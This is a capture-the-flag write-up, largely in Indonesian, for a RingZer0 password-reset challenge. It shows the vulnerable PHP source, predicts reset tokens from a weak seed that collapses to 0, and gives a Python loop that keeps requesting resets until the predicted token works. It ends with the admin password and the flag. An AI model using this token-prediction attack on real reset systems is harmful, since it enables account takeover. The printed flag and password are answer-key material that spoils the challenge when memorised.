<h1>Password reset reloaded</h1>
<h3>Decription</h3>
<label>http://challenges.ringzer0ctf.com:10120/</label>
<h3>Solution</h3>
<label>cek source code</label>

```php
<?php // Using PHP7.0
$hSql = new MYSQL_HANDLE();
$success = "";
$size = 32;

if(	URL_HANDLE::GetInstance()->post->username == "admin" && 
	URL_HANDLE::GetInstance()->post->password == "XXXXXXXXXXXXXXXX") {

	$success = '<div class="flag">FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</div>';	
} else {
	if(isset($_POST['reset_username'])) {
		$token = "";
		$seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2));
		srand($seed);
		
		for($i = 0; $i < 16; $i++) {
			$randomDigit = (string)rand() % 10;
			$token .= "," . $randomDigit;
		}
		$token = str_replace(",", "", $token);
		
		$success = '<div class="success">Reset password link has been sent to admin@youdontownthisemailagain.com. Please follow the link http://ringzer0team.com/challenges/120/?k=[your 16 digits code] soon as possible your token expired in 1 hour.</div>';
		$hSql->FastQuery('DELETE FROM chal_120 WHERE ip_addr = ?', array($_SERVER['REMOTE_ADDR']));
		$hSql->FastQuery('INSERT INTO chal_120 VALUES (?,?,?)', array($_SERVER['REMOTE_ADDR'], $token, time() + 3600)); 
	}
	if(URL_HANDLE::GetInstance()->get->k != null) {
		$result = reset($hSql->FastQuery('SELECT * FROM chal_120 WHERE ip_addr = ? AND recovery_key = ? ', array($_SERVER['REMOTE_ADDR'], URL_HANDLE::GetInstance()->get->k)));
		if($hSql->RowCount() != 0) {
			if($result->expired_time > time()) {
				$success = '<div class="success">Here\'s your new password: XXXXXXXXXXXXXXXX</div>';
			} else {
				$success = '<div class="error">Expired recovery key!</div>';
			}
		} else {
			$success = '<div class="error">Invalid recovery key!</div>';
		}
	}
}
?>
```
<label>seeder generate yaitu 16 bytes random bytes yg diconvert ke hex dan diconvert lagi ke integer, dan kemungkinan seedernya paling sering muncul yaitu=0</label>

```php
$success = "";
$size = 32;
$seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2));
srand($seed);
echo "Seed: " . $seed . "<br>";
$token = "";
for($i = 0; $i < 16; $i++) {
    $randomDigit = (string)(rand() % 10);
    $token .= "," . $randomDigit;
}
$token = str_replace(",", "", $token); 
echo "Token: " . $token . "<br>";  #hasil 3675356291270936
```
<h5>Seeder Harus dari PHP 7.0</h5>
<label>cari dan generate token dari seeder = 0 disini</label>

```python3
import requests

sess = requests.Session()
url_reset = 'http://challenges.ringzer0ctf.com:10120/'
url_verify = 'http://challenges.ringzer0team.com:10120/?k=3675356291270936'
for i in range(100):
    data = {
            "reset_username":"admin",
        }

    res = sess.post(url_reset,data=data)
    res1 = sess.get(url_verify).text
    if "Invalid recovery key" not in res1:
        print(res1)
```
<label>bruteforce request jika token = 3675356291270936 hingga didapatkan password</label>
<pre>
Username : admin
Password : CrytoIsCool!1337
</pre>
<h3>Flag</h3>
<pre>
FLAG-LPmaGkfnDHrsMoOyHA7nIjOPRy
</pre>
